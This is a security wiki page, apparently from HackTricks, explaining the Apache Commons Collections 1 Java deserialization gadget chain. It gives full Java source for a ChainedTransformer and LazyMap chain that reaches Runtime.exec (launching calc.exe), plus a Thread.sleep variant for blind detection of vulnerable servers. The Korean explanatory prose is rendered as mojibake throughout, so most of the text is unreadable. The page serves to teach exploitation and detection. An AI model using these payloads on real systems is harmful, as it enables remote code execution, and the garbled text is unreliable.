# CommonsCollection1 Payload - Java Transformers to Rutime exec() and Thread Sleep

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Java Transformers to Rutime exec()

ì—¬ëŸ¬ ê³³ì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ Apache common collectionsì˜ transformersë¥¼ ì‚¬ìš©í•˜ëŠ” java deserialization payloadë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1PayloadOnly {
public static void main(String... args) {
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Runtime.class), //(1)
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
), //(2)
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
), //(3)
new InvokerTransformer("exec",
new Class[]{String.class},
command
) //(4)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");
}
}
```
Java deserialization payloadsì— ëŒ€í•´ ì•„ë¬´ê²ƒë„ ëª¨ë¥¸ë‹¤ë©´ ì´ ì½”ë“œê°€ calcë¥¼ ì‹¤í–‰í•˜ëŠ” ì´ìœ ë¥¼ íŒŒì•…í•˜ê¸° ì–´ë ¤ìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìš°ì„ , **Javaì˜ Transformer**ëŠ” **í´ë˜ìŠ¤ë¥¼ ìˆ˜ì‹ **í•˜ê³  **ë‹¤ë¥¸ í´ë˜ìŠ¤ë¡œ ë³€í™˜**í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.\
ë˜í•œ ì—¬ê¸°ì„œ **ì‹¤í–‰ë˜ëŠ” payload**ëŠ” **ë‹¤ìŒê³¼ ë™ë“±**í•˜ë‹¤ëŠ” ê²ƒì„ ì•„ëŠ” ê²ƒì´ í¥ë¯¸ë¡­ìŠµë‹ˆë‹¤:
```java
Runtime.getRuntime().exec(new String[]{"calc.exe"});
```
ë˜ëŠ” **ë” ì •í™•íˆ** ë§í•˜ìë©´, ë§ˆì§€ë§‰ì— ì‹¤í–‰ë  ê²ƒì€:
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
### ë°©ë²•

ê·¸ë˜ì„œ, ì²« ë²ˆì§¸ í˜ì´ë¡œë“œê°€ ê·¸ "ê°„ë‹¨í•œ" ì›ë¼ì´ë„ˆì™€ ì–´ë–»ê²Œ ë™ë“±í•œê°€ìš”?

**ì²«ì§¸**ë¡œ, í˜ì´ë¡œë“œì—ì„œ **ë³€í™˜ì˜ ì²´ì¸(ë°°ì—´)ì´ ìƒì„±ëœë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤**:
```java
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
//(1) - Get gadget Class (from Runtime class)
new ConstantTransformer(Runtime.class),

//(2) - Call from gadget Class (from Runtime class) the function "getMetod" to obtain "getRuntime"
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
),

//(3) - Call from (Runtime) Class.getMethod("getRuntime") to obtain a Runtime oject
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
),

//(4) - Use the Runtime object to call exec with arbitrary commands
new InvokerTransformer("exec",
new Class[]{String.class},
command
)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```
ì½”ë“œë¥¼ ì½ì–´ë³´ë©´ ë°°ì—´ì˜ ë³€í™˜ì„ ì–´ë–»ê²Œë“  ì—°ê²°í•˜ë©´ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ë˜ì„œ, **ê·¸ ë³€í™˜ë“¤ì€ ì–´ë–»ê²Œ ì—°ê²°ë˜ë‚˜ìš”?**
```java
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);
lazyMap.get("anything");
```
ë§ˆì§€ë§‰ ì„¹ì…˜ì—ì„œ **Map ê°ì²´ê°€ ìƒì„±ë©ë‹ˆë‹¤**. ê·¸ëŸ° ë‹¤ìŒ, `LazyMap`ì—ì„œ ë§µ ê°ì²´ì™€ ì²´ì¸ëœ ë³€í™˜ê¸°ë¥¼ ì‚¬ìš©í•˜ì—¬ `decorate` í•¨ìˆ˜ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤. ë‹¤ìŒ ì½”ë“œë¥¼ í†µí•´ **ì²´ì¸ëœ ë³€í™˜ê¸°**ê°€ `lazyMap.factory` ì†ì„± ì•ˆì— ë³µì‚¬ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
protected LazyMap(Map map, Transformer factory) {
super(map);
if (factory == null) {
throw new IllegalArgumentException("Factory must not be null");
}
this.factory = factory;
}
```
ê·¸ë¦¬ê³  ë§ˆì§€ë§‰ ëŒ€ë¯¸ë¥¼ ì¥ì‹í•˜ëŠ” ê²ƒì€ ì‹¤í–‰ëœë‹¤: `lazyMap.get("anything");`

ì´ê²ƒì€ `get` í•¨ìˆ˜ì˜ ì½”ë“œì´ë‹¤:
```java
public Object get(Object key) {
if (map.containsKey(key) == false) {
Object value = factory.transform(key);
map.put(key, value);
return value;
}
return map.get(key);
}
```
ê·¸ë¦¬ê³  ì´ê²ƒì€ `transform` í•¨ìˆ˜ì˜ ì½”ë“œì…ë‹ˆë‹¤.
```java
public Object transform(Object object) {
for (int i = 0; i < iTransformers.length; i++) {
object = iTransformers[i].transform(object);
}
return object;
}
```
ê·¸ë˜ì„œ, **factory** ì•ˆì— **`chainedTransformer`**ë¥¼ ì €ì¥í–ˆìŒì„ ê¸°ì–µí•˜ì„¸ìš”. ê·¸ë¦¬ê³  **`transform`** í•¨ìˆ˜ ì•ˆì—ì„œ ìš°ë¦¬ëŠ” **ëª¨ë“  ì²´ì¸ëœ ë³€í™˜ê¸°ë¥¼ ìˆœíšŒí•˜ë©°** í•˜ë‚˜ì”© ì‹¤í–‰í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì¬ë¯¸ìˆëŠ” ì ì€ **ê° ë³€í™˜ê¸°ê°€ `object`** **ë¥¼ ì…ë ¥ìœ¼ë¡œ ì‚¬ìš©í•˜ê³ ** **objectëŠ” ë§ˆì§€ë§‰ìœ¼ë¡œ ì‹¤í–‰ëœ ë³€í™˜ê¸°ì—ì„œ ì¶œë ¥ë©ë‹ˆë‹¤**. ë”°ë¼ì„œ **ëª¨ë“  ë³€í™˜ì´ ì•…ì˜ì ì¸ í˜ì´ë¡œë“œë¥¼ ì²´ì¸ìœ¼ë¡œ ì‹¤í–‰í•˜ê³  ìˆìŠµë‹ˆë‹¤**.

### ìš”ì•½

ê²°êµ­, lazyMapì´ get ë©”ì„œë“œ ì•ˆì—ì„œ ì²´ì¸ëœ ë³€í™˜ê¸°ë¥¼ ê´€ë¦¬í•˜ëŠ” ë°©ì‹ ë•Œë¬¸ì—, ë§ˆì¹˜ ìš°ë¦¬ê°€ ë‹¤ìŒ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒê³¼ ê°™ìŠµë‹ˆë‹¤:
```java
Object value = "someting";

value = new ConstantTransformer(Runtime.class).transform(value); //(1)

value = new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", null}
).transform(value); //(2)

value = new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
).transform(value); //(3)

value = new InvokerTransformer("exec",
new Class[]{String.class},
command
).transform(value); //(4)
```
_ê° ë³€í™˜ì˜ ì…ë ¥ì´ `value`ì´ê³  ì´ì „ ë³€í™˜ì˜ ì¶œë ¥ì„ì„ ì£¼ëª©í•˜ì„¸ìš”. ì´ëŠ” í•œ ì¤„ì§œë¦¬ ì‹¤í–‰ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤:_
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
Note that here it **was explained the gadgets** used for the **ComonsCollections1** payload. But it's left **how all this starts it's executing**. You can see [here that **ysoserial**](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java), in order to execute this payload, uses an `AnnotationInvocationHandler` object because **when this object gets deserialized**, it will **invoke** the `payload.get()` function that will **execute the whole payload**.

## Java Thread Sleep

ì´ í˜ì´ë¡œë“œëŠ” **ì›¹ì´ ì·¨ì•½í•œì§€ ì‹ë³„í•˜ëŠ” ë° ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½í•˜ë‹¤ë©´ ìŠ¬ë¦½ì„ ì‹¤í–‰í•  ê²ƒì…ë‹ˆë‹¤.**
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1Sleep {
public static void main(String... args) {
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Thread.class),
new InvokerTransformer("getMethod",
new Class[]{
String.class, Class[].class
},
new Object[]{
"sleep", new Class[]{Long.TYPE}
}),
new InvokerTransformer("invoke",
new Class[]{
Object.class, Object[].class
}, new Object[]
{
null, new Object[] {7000L}
}),
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");

}
}
```
## ë” ë§ì€ ê°€ì ¯

ë” ë§ì€ ê°€ì ¯ì„ ì—¬ê¸°ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)

##

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
